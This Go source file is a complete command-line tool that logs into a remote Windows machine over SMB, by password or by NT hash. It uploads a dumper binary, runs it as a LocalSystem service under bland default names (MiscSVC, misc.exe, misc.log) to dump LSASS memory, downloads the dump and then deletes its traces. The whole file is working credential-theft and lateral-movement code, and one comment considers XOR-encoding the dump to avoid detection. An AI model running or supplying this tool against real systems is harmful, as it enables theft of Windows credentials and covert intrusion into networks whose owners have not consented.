// MIT License
//
// # Copyright (c) 2023 Jimmy Fjällid
//
// Permission is hereby granted, free of charge, to any person obtaining a copy
// of this software and associated documentation files (the "Software"), to deal
// in the Software without restriction, including without limitation the rights
// to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
// copies of the Software, and to permit persons to whom the Software is
// furnished to do so, subject to the following conditions:
//
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
//
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
package main

import (
	"encoding/hex"
	"flag"
	"fmt"
	"os"
	"strings"
	"time"

	rundebug "runtime/debug"

	"golang.org/x/term"

	"github.com/jfjallid/go-smb/smb"
	"github.com/jfjallid/go-smb/smb/dcerpc"
	"github.com/jfjallid/golog"
)

var log = golog.Get("")
var release string = "0.1.1"
var bind *dcerpc.ServiceBind
var session *smb.Connection

func isFlagSet(name string) bool {
	found := false
	flag.Visit(func(f *flag.Flag) {
		if f.Name == name {
			found = true
		}
	})
	return found
}

func installService(serviceName, exePath string, args []string) error {
	if bind == nil {
		err := fmt.Errorf("Must bind to the Service pipe first")
		log.Errorln(err)
		return err
	}
	// If service already exists, abort
	_, err := bind.GetServiceStatus(serviceName)
	if err != nil {
		if err != dcerpc.ServiceResponseCodeMap[dcerpc.ErrorServiceDoesNotExist] {
			log.Errorln(err)
			return err
		}
	} else {
		// Service already exists
		log.Errorf("Service %s already exists. If this is from an old deployment, "+
			"run --cleanup to uninstall the service before trying again. "+
			"Otherwise, choose another service name\n", serviceName)

		return fmt.Errorf("Service already exists!")
	}

	// Create the service
	err = bind.CreateService(serviceName, dcerpc.ServiceWin32OwnProcess, dcerpc.ServiceDemandStart, dcerpc.ServiceErrorIgnore, exePath, "LocalSystem", serviceName, false)
	if err != nil {
		log.Errorln(err)
		return err
	}

	// Start service with arguments
	err = bind.StartService(serviceName, args)
	if err != nil {
		log.Errorln(err)
		return err
	}

	return nil
}

func cleanup(o smb.Options, serviceName, svcBinaryFullPath, dumpFilePath string) (err error) {
	/*
	   Delete and stop service
	   Delete svc binary
	   Delete lsass dmp file
	*/
	if session == nil {
		// Assume a standalone cleanup run
		session, err = smb.NewConnection(o)
		if err != nil {
			log.Criticalln(err)
			return
		}

		defer session.Close()
	}
	if bind == nil {
		share := "IPC$"
		err = session.TreeConnect(share)
		if err != nil {
			log.Errorln(err)
			return
		}
		defer session.TreeDisconnect(share)
		svcctl, err2 := session.OpenFile(share, "svcctl")
		if err2 != nil {
			log.Errorln(err2)
			return err2
		}
		defer svcctl.CloseFile()

		bind, err = dcerpc.Bind(svcctl, dcerpc.MSRPCUuidSvcCtl, dcerpc.MSRPCSvcCtlMajorVersion, dcerpc.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
		if err != nil {
			log.Errorln("Failed to bind to service")
			log.Errorln(err)
			return
		}
	}

	log.Infof("Trying to uninstall the %s service\n", serviceName)
	err = bind.DeleteService(serviceName)
	if err != nil {
		log.Errorln(err)
	} else {
		log.Infof("Successfully uninstalled the %s service\n", serviceName)
	}

	log.Infof("Trying to delete the %s service binary (%s)\n", serviceName, svcBinaryFullPath)
	err = session.DeleteFile("C$", svcBinaryFullPath[3:])
	if err != nil {
		log.Errorln(err)
	} else {
		log.Infof("Successfully deleted the %s service binary\n", svcBinaryFullPath)
	}

	log.Infof("Trying to delete the dump file %s\n", dumpFilePath)
	err = session.DeleteFile("C$", dumpFilePath[3:])
	if err != nil {
		if err != smb.StatusMap[smb.StatusObjectNameNotFound] {
			log.Errorln(err)
			return
		}
		// File did not exist so do nothing
	} else {
		log.Infof("Successfully deleted the dump file %s\n", dumpFilePath)
	}
	log.Infoln("Successfully cleaned up the deployed service and files")
	return
}

var helpMsg = `
    Usage: ` + os.Args[0] + ` [options]

    options:
          --host                Hostname or ip address of remote server
      -P, --port                SMB Port (default 445)
      -d, --domain              Domain name to use for login
      -u, --user                Username
      -p, --pass                Password
          --hash                Hex encoded NT Hash for user password
          --local               Authenticate as a local user instead of domain user
      -n, --null                Attempt null session authentication
      -t, --timeout             Dial timeout in seconds (default 5)
          --cleanup             Perform a cleanup of service binary, service, and dumpfile
          --dumper <path>       Path to local lsass dump utility (default pdumpsvc.exe)
          --service <name>      Name of service that will be created to run the lsass dumper (default MiscSVC)
          --service-filename    Name of service binary (default misc.exe)
          --service-dir         Remote path on C: to store service binary (default C:\windows\)
          --dumpfile            Name of lsass dump file written to disk (default misc.log)
          --dumpdir             Remote path on C: to temporarily store the lsass dump (default C:\windows\)
          --output              Path to where to store the lsass dump locally (default lsass.dmp)
          --noenc               Disable smb encryption
          --smb2                Force smb 2.1
          --debug               Enable debug logging
          --verbose             Enable verbose logging
      -v, --version             Show version
`

func main() {
	var host, username, password, hash, domain, serviceName, dumper, svcBinaryName, svcBinaryPath, dumpFileName, dumpDir, outFile string
	var port, dialTimeout int
	var debug, noEnc, forceSMB2, localUser, nullSession, version, runCleanup, verbose bool
	var err error
	var hashBytes []byte

	flag.Usage = func() {
		fmt.Println(helpMsg)
		os.Exit(0)
	}

	flag.StringVar(&host, "host", "", "")
	flag.StringVar(&username, "u", "", "")
	flag.StringVar(&username, "user", "", "")
	flag.StringVar(&password, "p", "", "")
	flag.StringVar(&password, "pass", "", "")
	flag.StringVar(&hash, "hash", "", "")
	flag.StringVar(&domain, "d", "", "")
	flag.StringVar(&domain, "domain", "", "")
	flag.IntVar(&port, "P", 445, "")
	flag.IntVar(&port, "port", 445, "")
	flag.BoolVar(&debug, "debug", false, "")
	flag.BoolVar(&verbose, "verbose", false, "")
	flag.BoolVar(&noEnc, "noenc", false, "")
	flag.BoolVar(&forceSMB2, "smb2", false, "")
	flag.BoolVar(&localUser, "local", false, "")
	flag.IntVar(&dialTimeout, "t", 5, "")
	flag.IntVar(&dialTimeout, "timeout", 5, "")
	flag.BoolVar(&version, "v", false, "")
	flag.BoolVar(&version, "version", false, "")
	flag.BoolVar(&runCleanup, "cleanup", false, "")
	flag.StringVar(&dumper, "dumper", "pdumpsvc.exe", "")
	flag.StringVar(&serviceName, "service", "MiscSVC", "")
	flag.StringVar(&svcBinaryName, "service-filename", "misc.exe", "")
	flag.StringVar(&svcBinaryPath, "service-dir", "C:\\windows\\", "")
	flag.StringVar(&dumpFileName, "dumpfile", "misc.log", "")
	flag.StringVar(&outFile, "output", "lsass.dmp", "")
	flag.StringVar(&dumpDir, "dumpdir", "C:\\windows\\", "")

	flag.Parse()

	if debug {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelDebug, golog.LstdFlags|golog.Lshortfile, golog.DefaultOutput, golog.DefaultErrOutput)
		log.SetFlags(golog.LstdFlags | golog.Lshortfile)
		log.SetLogLevel(golog.LevelDebug)
	} else if verbose {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		log.SetLogLevel(golog.LevelInfo)
	} else {
		golog.Set("github.com/jfjallid/go-smb/smb", "smb", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/gss", "gss", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
		golog.Set("github.com/jfjallid/go-smb/smb/dcerpc", "dcerpc", golog.LevelError, golog.LstdFlags, golog.DefaultOutput, golog.DefaultErrOutput)
	}

	if version {
		fmt.Printf("Version: %s\n", release)
		bi, ok := rundebug.ReadBuildInfo()
		if !ok {
			log.Errorln("Failed to read build info to locate version imported modules")
		}
		for _, m := range bi.Deps {
			fmt.Printf("Package: %s, Version: %s\n", m.Path, m.Version)
		}
		return
	}

	if host == "" {
		log.Errorln("Must specify a hostname")
		flag.Usage()
		return
	}

	if serviceName == "" {
		log.Errorln("--service argument cannot be empty")
		return
	}

	if dumper == "" {
		log.Errorln("A lsass dump binary is required and the --binary flag cannot be empty")
		return
	}

	if svcBinaryName == "" {
		log.Errorln("--service-filename cannot be empty")
		return
	} else if !strings.HasSuffix(svcBinaryName, ".exe") {
		log.Errorln("--service-filename expects an .exe file")
		return
	}

	if svcBinaryPath == "" {
		log.Errorln("--service-dir cannot be empty")
		return
	} else if !strings.HasPrefix(strings.ToUpper(svcBinaryPath), "C:\\") {
		log.Errorln("--service-dir must be an absolute path starting with C:\\")
		return
	}

	if !strings.HasSuffix(svcBinaryPath, "\\") {
		svcBinaryPath += "\\"
	}

	if dumpFileName == "" {
		log.Errorln("--dumpfile cannot be empty")
		return
	}

	if dumpDir == "" {
		log.Errorln("--dump-dir cannot be empty")
		return
	} else if !strings.HasPrefix(strings.ToUpper(dumpDir), "C:\\") {
		log.Errorln("--dump-dir must be an absolute path starting with C:\\")
		return
	}

	if !strings.HasSuffix(dumpDir, "\\") {
		dumpDir += "\\"
	}

	if outFile == "" {
		log.Errorln("--output cannot be empty")
		return
	}

	if dialTimeout < 1 {
		log.Errorln("Valid value for the timeout is > 0 seconds")
		return
	}

	if hash != "" {
		hashBytes, err = hex.DecodeString(hash)
		if err != nil {
			fmt.Println("Failed to decode hash")
			log.Errorln(err)
			return
		}
	}

	if (password == "") && (hashBytes == nil) {
		if (username != "") && (!nullSession) {
			// Check if password is already specified to be empty
			if !isFlagSet("P") && !isFlagSet("pass") {
				fmt.Printf("Enter password: ")
				passBytes, err := term.ReadPassword(int(os.Stdin.Fd()))
				fmt.Println()
				if err != nil {
					log.Errorln(err)
					return
				}
				password = string(passBytes)
			}
		}
	}

	timeout, err := time.ParseDuration(fmt.Sprintf("%ds", dialTimeout))
	if err != nil {
		log.Errorln(err)
		return
	}
	options := smb.Options{
		Host: host,
		Port: port,
		Initiator: &smb.NTLMInitiator{
			User:               username,
			Password:           password,
			Hash:               hashBytes,
			Domain:             domain,
			LocalUser:          localUser,
			NullSession:        nullSession,
			EncryptionDisabled: noEnc,
		},
		DisableEncryption: noEnc,
		ForceSMB2:         forceSMB2,
		DialTimeout:       timeout,
	}
	session, err = smb.NewConnection(options)
	if err != nil {
		log.Criticalln(err)
		return
	}
	defer session.Close()

	if session.IsSigningRequired.Load() {
		log.Noticeln("[-] Signing is required")
	} else {
		log.Noticeln("[+] Signing is NOT required")
	}

	if session.IsAuthenticated {
		log.Noticeln("[+] Login successful")
	} else {
		log.Noticeln("[-] Login failed")
	}

	if runCleanup {
		err = cleanup(options, serviceName, svcBinaryPath+svcBinaryName, dumpDir+dumpFileName)
		if err != nil {
			log.Errorln(err)
		}
		return
	}

	f, err := os.Open(dumper)
	if err != nil {
		log.Errorln("Failed to open file referenced by --dumper flag")
		return
	}

	//defer cleanup(options, serviceName, svcBinaryPath + svcBinaryName, dumpDir + dumpFileName)

	err = session.PutFile("C$", svcBinaryPath[3:]+svcBinaryName, 0, f.Read)
	if err != nil {
		log.Errorf("Failed to upload lsass dumper binary with error: %s\n", err)
		f.Close()
		return
	}
	f.Close()
	log.Infof("Successfully uploaded %s to %s%s\n", dumper, svcBinaryPath, svcBinaryName)

	// Create and start service
	share := "IPC$"
	err = session.TreeConnect(share)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer session.TreeDisconnect(share)

	svcctl, err := session.OpenFile(share, "svcctl")
	if err != nil {
		log.Errorln(err)
		return
	}
	defer svcctl.CloseFile()

	bind, err = dcerpc.Bind(svcctl, dcerpc.MSRPCUuidSvcCtl, dcerpc.MSRPCSvcCtlMajorVersion, dcerpc.MSRPCSvcCtlMinorVersion, dcerpc.MSRPCUuidNdr)
	if err != nil {
		log.Errorln("Failed to bind to service")
		log.Errorln(err)
		return
	}

	err = installService(serviceName, svcBinaryPath+svcBinaryName, []string{"lsass.exe", dumpDir + dumpFileName})
	if err != nil {
		log.Errorln(err)
		return
	}

	for {
		status, err := bind.GetServiceStatus(serviceName)
		if err != nil {
			log.Errorln(err)
			return
		}

		if (status == dcerpc.ServiceRunning) || (status == dcerpc.ServiceStartPending) {
			time.Sleep(time.Second)
		} else {
			// Hopefully the dump is completed
			break
		}
	}

	// Retrieve and delete dump file
	f, err = os.OpenFile(outFile, os.O_CREATE|os.O_TRUNC|os.O_RDWR, 0600)
	if err != nil {
		log.Errorln(err)
		return
	}
	defer f.Close()

	// Perhaps an intermediate layer to XOR every byte before writing to disk?
	err = session.RetrieveFile("C$", dumpDir[3:]+dumpFileName, 0, f.Write)
	if err != nil {
		log.Errorln(err)
		return
	}
	log.Infof("Successfully downloaded the LSASS dump into local file %s\n", outFile)
}
